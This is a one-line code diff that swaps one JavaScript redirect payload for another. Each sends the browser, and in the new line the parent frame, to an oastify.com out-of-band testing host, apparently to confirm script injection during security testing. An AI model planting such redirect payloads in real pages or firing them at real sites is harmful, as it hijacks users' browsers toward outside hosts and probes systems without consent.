@@ -1,1 +1,1 @@
-location.href = 'http://xopm0fo1g39jx33osrtoj83uslycm7aw.oastify.com/dsadsadsa'
+parent.location.replace('https://oe6dq6es6uzanutfiijf9ztlico3cz0o.oastify.com/dsadas')
